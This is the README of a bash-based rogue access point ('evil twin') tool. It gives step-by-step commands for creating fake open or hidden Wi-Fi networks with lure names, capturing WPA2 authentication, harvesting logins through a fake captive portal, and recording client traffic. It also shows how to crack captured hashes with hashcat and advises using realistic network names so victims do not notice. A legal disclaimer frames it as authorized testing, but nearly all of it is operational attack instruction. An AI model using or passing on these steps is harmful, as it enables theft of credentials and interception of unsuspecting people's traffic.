# Fake Access Point Suite

Advanced wireless access point creation tool with password capture, monitoring, and captive portal capabilities.

## ⚠️ LEGAL WARNING

**This tool is for authorized security testing and educational purposes ONLY.**

- Only use on networks you own or have explicit written permission to test
- Unauthorized access point creation may be illegal in your jurisdiction
- Password interception without consent is a criminal offense in most countries
- Captive portal credential harvesting must only be used in authorized penetration tests
- Check your local laws before use

**The authors assume no liability for misuse of this software.**

---

## 📋 Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Advanced Features](#advanced-features)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)

---

## ✨ Features

### Core Features
- ✅ Create fake wireless access points
- ✅ WPA2 password capture (with hostapd-wpe)
- ✅ Open network support
- ✅ Internet sharing via uplink interface
- ✅ DHCP server with configurable ranges
- ✅ DNS forwarding

### Advanced Features
- 🔐 **Captive portal** for credential harvesting
- 📊 **Packet monitoring** with tcpdump
- 🚫 **MAC address filtering** (whitelist/blacklist)
- 📉 **Bandwidth limiting** per client
- 👻 **Hidden SSID** (stealth mode)
- 📱 **Multi-adapter support** with capability detection
- 📈 **Real-time monitoring** and statistics
- 💾 **Comprehensive logging** of all activities

---

## 🔧 Requirements

### Hardware
- Wireless adapter with **AP mode** support
- USB or built-in wireless card (check compatibility)

### Software
- Debian/Ubuntu-based Linux distribution (Kali, Parrot, etc.)
- Root/sudo access
- Kernel 4.0+ recommended

### Required Packages
- `hostapd` - Access point daemon
- `dnsmasq` - DHCP and DNS server
- `iptables` - Firewall and NAT
- `iw` - Wireless configuration
- `iproute2` - Network configuration

### Optional Packages
- `hostapd-wpe` - For password capture
- `tcpdump` - For packet monitoring
- `python3` - For captive portal
- `aircrack-ng` - For advanced monitoring
- `ethtool` - For adapter information

---

## 📦 Installation

### 1. Clone or Download

```bash
# Download the scripts
wget https://example.com/fake_ap.sh
wget https://example.com/setup.sh
wget https://example.com/test.sh

# Make executable
chmod +x fake_ap.sh setup.sh test.sh
```

### 2. Run Setup Script

```bash
# Basic installation
sudo ./setup.sh

# With password capture support
sudo ./setup.sh --with-wpe
```

### 3. Test Your System

```bash
# Quick compatibility check
sudo ./test.sh --quick

# Full system test
sudo ./test.sh --full

# Test specific adapter
sudo ./test.sh --adapter wlan0
```

---

## 🚀 Quick Start

### Check Available Adapters

```bash
sudo ./fake_ap.sh list-adapters
```

### Create Basic Open Network

```bash
sudo ./fake_ap.sh "FreeWiFi" 6 eth0
```

### Create Network with Password Capture

```bash
sudo ./fake_ap.sh "CoffeeShop" 6 eth0 wlan0 --capture-auth
```

### Create Hidden Network with Captive Portal

```bash
sudo ./fake_ap.sh "SecureNet" 11 eth0 --hide-ssid --captive-portal
```

### Stop the Access Point

```bash
sudo ./fake_ap.sh stop eth0
```

### Check Status

```bash
sudo ./fake_ap.sh status
```

---

## 📖 Usage

### Basic Syntax

```bash
sudo ./fake_ap.sh SSID CHANNEL UPLINK_IF [WLAN_IF] [OPTIONS]
```

### Parameters

| Parameter | Description | Example |
|-----------|-------------|---------|
| `SSID` | Network name | `"FreeWiFi"` |
| `CHANNEL` | WiFi channel (1-14) | `6` or `11` |
| `UPLINK_IF` | Internet interface or `none` | `eth0`, `enp1s0` |
| `WLAN_IF` | Wireless interface (optional) | `wlan0` |

### Options

| Option | Description |
|--------|-------------|
| `--capture-auth` | Enable WPA2 password capture |
| `--monitor` | Enable packet monitoring with tcpdump |
| `--mac-filter` | Enable MAC address filtering |
| `--bandwidth-limit N` | Limit bandwidth to N KB/s per client |
| `--captive-portal` | Enable credential harvesting portal |
| `--hide-ssid` | Hide SSID broadcast (stealth mode) |
| `--adapter-check` | Check adapter capabilities |

### Commands

| Command | Description |
|---------|-------------|
| `list-adapters` | Show all wireless adapters and capabilities |
| `status` | Show current AP status and statistics |
| `stop [UPLINK_IF]` | Stop the access point |
| `--help` | Display help message |

---

## 🎯 Advanced Features

### 1. Password Capture

Captures WPA2 passwords from connecting clients:

```bash
sudo ./fake_ap.sh "TestAP" 6 eth0 --capture-auth
```

**View captured passwords:**
```bash
cat /tmp/fakeap_auth_attempts.log
```

### 2. Captive Portal

Creates a fake login page to harvest credentials:

```bash
sudo ./fake_ap.sh "Free WiFi" 6 eth0 --captive-portal
```

**View portal captures:**
```bash
cat /tmp/fakeap_portal_credentials.log
```

Portal URL: `http://192.168.1.1`

### 3. Packet Monitoring

Captures all wireless traffic:

```bash
sudo ./fake_ap.sh "MonitorAP" 6 eth0 --monitor
```

**View captures:**
```bash
ls -lh /tmp/fakeap_pcaps/
wireshark /tmp/fakeap_pcaps/capture_*.pcap
```

### 4. MAC Filtering

Control which devices can connect:

```bash
sudo ./fake_ap.sh "FilteredAP" 6 eth0 --mac-filter
```

**Add to whitelist:**
```bash
echo "AA:BB:CC:DD:EE:FF" >> /tmp/fakeap_mac_whitelist.txt
```

**Add to blacklist:**
```bash
echo "11:22:33:44:55:66" >> /tmp/fakeap_mac_blacklist.txt
```

### 5. Bandwidth Limiting

Limit speed per client:

```bash
sudo ./fake_ap.sh "SlowWiFi" 6 eth0 --bandwidth-limit 512
```

### 6. Hidden SSID

Create stealth access point:

```bash
sudo ./fake_ap.sh "HiddenNet" 6 eth0 --hide-ssid
```

### 7. Combined Features

Use multiple features together:

```bash
sudo ./fake_ap.sh "AdvancedAP" 6 eth0 wlan0 \
  --capture-auth \
  --monitor \
  --captive-portal \
  --bandwidth-limit 1024 \
  --hide-ssid
```

---

## 🔍 Monitoring and Logs

### Log Locations

| File | Description |
|------|-------------|
| `/tmp/fakeap_auth_attempts.log` | WPA2 password captures |
| `/tmp/fakeap_portal_credentials.log` | Captive portal credentials |
| `/tmp/fakeap_monitor.log` | Packet monitoring statistics |
| `/tmp/hostapd_fakeap.log` | hostapd daemon log |
| `/tmp/dnsmasq_fakeap.log` | DHCP/DNS server log |
| `/tmp/fakeap_pcaps/` | Packet capture files |

### Real-time Monitoring

```bash
# Watch hostapd log
tail -f /tmp/hostapd_fakeap.log

# Watch authentication attempts
tail -f /tmp/fakeap_auth_attempts.log

# Watch portal captures
tail -f /tmp/fakeap_portal_credentials.log

# Check connected clients
cat /var/lib/misc/dnsmasq.leases
```

### Statistics

```bash
# Full status report
sudo ./fake_ap.sh status

# Connected clients
arp -n | grep 192.168.1

# Traffic statistics
iptables -L -n -v
```

---

## 🛠️ Troubleshooting

### Common Issues

#### 1. "No wireless interface detected"

**Solution:**
```bash
# Check interfaces
ip link show
iw dev

# List compatible adapters
sudo ./fake_ap.sh list-adapters

# Test specific adapter
sudo ./test.sh --adapter wlan0
```

#### 2. "Adapter does not support AP mode"

**Solution:**
- Your wireless card doesn't support AP mode
- Try a different adapter (recommended: Atheros, Intel, MediaTek)
- Check compatibility: https://wireless.wiki.kernel.org

#### 3. "hostapd process died unexpectedly"

**Solution:**
```bash
# Check hostapd log
cat /tmp/hostapd_fakeap.log

# Common fixes:
# - Stop NetworkManager: sudo systemctl stop NetworkManager
# - Kill wpa_supplicant: sudo pkill wpa_supplicant
# - Check driver: ethtool -i wlan0
```

#### 4. "hostapd-wpe not found"

**Solution:**
```bash
# Install from repositories (Kali/Parrot)
sudo apt-get install hostapd-wpe

# Or build from source
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
make
sudo make install
```

#### 5. "dnsmasq failed to start"

**Solution:**
```bash
# Check if port 53 is in use
sudo lsof -i :53

# Stop conflicting DNS services
sudo systemctl stop systemd-resolved

# Check dnsmasq log
cat /tmp/dnsmasq_fakeap.log
```

#### 6. Clients can't get DHCP lease

**Solution:**
```bash
# Check DHCP log
cat /tmp/dnsmasq_fakeap.log

# Verify interface configuration
ip addr show wlan0

# Check iptables rules
iptables -L -n -v
```

### Run Diagnostics

```bash
# Quick system check
sudo ./test.sh --quick

# Full diagnostic test
sudo ./test.sh --full

# Attempt auto-fix
sudo ./test.sh --full --fix
```

### Reset Everything

```bash
# Stop fake AP
sudo ./fake_ap.sh stop

# Restart network services
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant

# Reboot if needed
sudo reboot
```

---

## ❓ FAQ

### Q: Is this legal?

**A:** Only on networks you own or have written permission to test. Unauthorized use is illegal.

### Q: Which wireless adapters work best?

**A:** Recommended chipsets:
- **Excellent:** Atheros (ath9k), Intel (iwlwifi), MediaTek (mt76xx)
- **Good:** Ralink (rt2800), Broadcom (limited)
- **Poor:** Realtek (rtl8xxx) - often limited AP support

### Q: Can I capture WPA2 handshakes?

**A:** Yes, with `--capture-auth` and `--monitor` options. Use aircrack-ng to crack captures.

### Q: Does this work in a VM?

**A:** Limited support. USB passthrough works better than built-in VM networking.

### Q: How do I crack captured hashes?

**A:** Use hashcat or aircrack-ng:
```bash
# Extract hash from log
grep "Hash:" /tmp/fakeap_auth_attempts.log

# Crack with hashcat
hashcat -m 5500 hash.txt wordlist.txt
```

### Q: Can clients detect this is a fake AP?

**A:** Possibly. Hidden SSIDs, captive portals, and weak signals may raise suspicion. Use realistic network names.

### Q: How do I make it persistent after reboot?

**A:** Create a systemd service or add to `/etc/rc.local` (not recommended for security).

### Q: Why is my internet sharing not working?

**A:** Check:
```bash
# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward

# Check NAT rules
iptables -t nat -L -n -v

# Verify uplink interface
ip addr show eth0
```

---

## 📚 Additional Resources

### Documentation
- [Hostapd Documentation](https://w1.fi/hostapd/)
- [Linux Wireless](https://wireless.wiki.kernel.org/)
- [Aircrack-ng Wiki](https://www.aircrack-ng.org/)

### Compatible Adapters Database
- https://wikidevi.wi-cat.ru/
- https://deviwiki.com/

### Security Testing
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Wireless Penetration Testing](https://www.offensive-security.com/)

---

## 📝 License

This tool is provided for educational and authorized testing purposes only.

**Use responsibly and legally.**

---

## 🤝 Contributing

Contributions are welcome! Please ensure all code:
- Includes proper error handling
- Has clear comments
- Follows bash best practices
- Includes security warnings where appropriate

---

## 📧 Support

For issues and questions:
1. Check the [Troubleshooting](#troubleshooting) section
2. Run diagnostics: `sudo ./test.sh --full`
3. Review logs in `/tmp/fakeap_*.log`

---

**Remember: Use this tool ethically and legally. Happy (authorized) testing! 🔐**